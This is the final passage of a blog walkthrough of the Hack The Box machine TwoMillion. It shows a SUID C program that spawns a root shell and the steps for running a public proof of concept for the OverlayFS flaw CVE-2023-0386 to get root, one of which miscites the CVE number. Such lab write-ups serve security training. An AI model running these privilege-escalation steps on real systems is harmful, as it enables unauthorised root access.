</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;could not setguid(0): %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Starting root shell...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Since, to set the uid or gid to root, User requires the root permission. As per expectations, We can see the <strong>Operation not permitted</strong> error from the code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john@machine:~$ gcc -Wall setuid.c -o setuid
</span></span><span class="line"><span class="cl">john@machine:~$ chmod +x setuid
</span></span><span class="line"><span class="cl">john@machine:~$ ./setuid
</span></span><span class="line"><span class="cl">could not setuid<span class="o">(</span>0<span class="o">)</span>: Operation not permitted
</span></span></code></pre></div><p>Here, User has changed the file&rsquo;s user and group ownership to root and also assigned the SUID to the file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@machine:/home/john$ chown root:root setuid
</span></span><span class="line"><span class="cl">root@machine:/home/john$ chmod +s setuid
</span></span></code></pre></div><p>Here, Lower privilege user John executed the file and since setuid file contains the SUID permission, at the end of file execution John was able to get the Root Shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john@machine:~$ ./setuid
</span></span><span class="line"><span class="cl">Starting root shell...
</span></span><span class="line"><span class="cl">root@machine:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>john<span class="o">)</span>
</span></span></code></pre></div><h3 id="geting-root-flag">Geting Root Flag<a hidden class="anchor" aria-hidden="true" href="#geting-root-flag">#</a></h3>
<p>I was using the POC for CVE-2023-0398 created by <a href="https://github.com/xkaneiki">xkaneiki</a>which is already available on <a href="https://github.com/xkaneiki/CVE-2023-0386">Github</a>.</p>
<p><strong>Commands:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">make</span> <span class="n">all</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118214402.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">fuse</span> <span class="p">.</span><span class="o">/</span><span class="n">ovlcap</span><span class="o">/</span><span class="n">lower</span> <span class="p">.</span><span class="o">/</span><span class="n">gc</span> <span class="o">&amp;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">exp</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118214424.png"></p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118214442.png"></p>
<p>We have the root flag.</p>
<p>We also have thank you message from HTB team. Let&rsquo;s try to read the message.</p>
<h3 id="thank-you-message-from-htb-team">Thank You Message from HTB Team<a hidden class="anchor" aria-hidden="true" href="#thank-you-message-from-htb-team">#</a></h3>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250119204826.png"></p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250119205017.png"></p>
<h4 id="final-thank-you-message">Final Thank You Message<a hidden class="anchor" aria-hidden="true" href="#final-thank-you-message">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Dear HackTheBox Community,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching <span class="m">2</span> million remarkable users! This incredible feat would not have been possible without each and every one of you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">To each and every member of the HackTheBox community, thank you <span class="k">for</span> being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Here<span class="err">&#39;</span>s to the next chapter, where we will <span class="k">continue</span> to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">With deepest gratitude,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The HackTheBox Team
</span></span></code></pre></div><h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<ul>
<li><a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/</a></li>
<li><a href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></li>
<li><a href="https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html">https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html</a></li>
<li><a href="https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/">https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/</a></li>
</ul>
<h2 id="connect-with-me">Connect with Me<a hidden class="anchor" aria-hidden="true" href="#connect-with-me">#</a></h2>
<ul>
<li><a href="https://www.linkedin.com/in/bhavik-kanejiya">LinkedIn</a></li>
<li><a href="https://twitter.com/bhavik_kanejiya">Twitter</a></li>
<li><a href="https://github.com/bhavik-kanejiya">GitHub</a></li>
<li><a href="https://app.hackthebox.com/users/1998342">Hack The Box</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://bhavik-kanejiya.github.io/tags/walkthrough/">Walkthrough</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/htb/">HTB</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/cve-2023-0386/">CVE-2023-0386</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/overlayfs/">OverlayFS</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://bhavik-kanejiya.github.io/blog/htb-cap-walkthrough/">
    <span class="title">« Prev</span>
    <br>
    <span>HTB Cap Walkthrough</span>
  </a>
  <a class="next" href="https://bhavik-kanejiya.github.io/blog/lets-peek-inside-the-admin-dashboard/">
    <span class="title">Next »</span>
    <br>
    <span>Let’s do a peek inside the admin dashboard - Abuse API endpoint</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© 2025 Bhavik Kanejiya</span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
